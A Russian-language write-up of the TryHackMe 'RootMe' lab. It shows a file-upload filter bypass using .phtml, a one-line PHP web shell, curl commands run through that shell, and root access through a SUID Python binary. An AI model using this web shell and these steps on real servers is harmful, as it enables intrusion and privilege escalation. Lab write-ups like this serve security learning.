# RootMe — TryHackMe Writeup

**Сложность:** Easy  
**Платформа:** TryHackMe  

---

## 🛠 Разведка (Enumeration)

Запустил сканирование портов и сервисов с помощью `nmap`:

```bash
nmap -sV -sC TARGET_IP

Результаты сканирования:
Plaintext

22/tcp — SSH (OpenSSH)
80/tcp — HTTP (Apache httpd 2.4.29)

🌐 Веб-разведка (Web Enumeration)

Запустил сканирование скрытых директорий через gobuster:
Bash

gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt

Обнаружил следующие интересные маршруты:

    /panel/ — веб-страница для загрузки файлов.

    /uploads/ — директория хранения загруженных файлов.

🚀 Первоначальный доступ (Initial Access)

    Обход фильтрации расширений файлов

Попробовал загрузить стандартный PHP-скрипт shell.php, но сервер заблокировал загрузку.

Обошел фильтр, изменив расширение файла на .phtml.

Создал файл shell.phtml со следующим содержимым:
PHP

<?php system($_GET["cmd"]); ?>

Загрузил shell.phtml через форму на странице /panel/.

    Выполнение команд (Command Execution)

Проверил выполнение системных команд через curl:
Bash

curl "http://TARGET_IP/uploads/shell.phtml?cmd=whoami"

Вывод:
Plaintext

www-data

    Чтение user.txt

Нашел файл первого флага с помощью find:
Bash

curl "http://TARGET_IP/uploads/shell.phtml?cmd=find%20/%20-name%20user.txt%202>/dev/null"

Прочитал содержимое user.txt:
Bash

curl "http://TARGET_IP/uploads/shell.phtml?cmd=cat%20/var/www/user.txt"

👑 Повышение привилегий (Privilege Escalation)

    Поиск SUID-файлов

Запустил поиск файлов с установленным SUID-битом, принадлежащих root:
Bash

curl "http://TARGET_IP/uploads/shell.phtml?cmd=find%20/%20-user%20root%20-perm%20-4000%202>/dev/null"

В списке стандартных утилит обнаружил нестандартный SUID-бинарник:
Plaintext

/usr/bin/python2.7

    Эксплуатация SUID (Python2.7)

Наличие SUID-бита на интерпретаторе Python позволяет исполнять Python-код с правами root.

Прочитал финальный флаг напрямую через Python:
Bash

curl "http://TARGET_IP/uploads/shell.phtml?cmd=/usr/bin/python2.7%20-c%20%27print(open(%22/root/root.txt%22).read())%27"

💡 Выводы и усвоенные уроки

    Фильтрация загружаемых файлов, основанная только на черном списке расширений (.php), легко обходится использованием альтернативных расширений (.phtml, .php5, .phar).

    Установка SUID-бита на интерпретаторы языков программирования (Python, Perl, Bash) создает критическую уязвимость, позволяя любому пользователю выполнять команды с правами root.
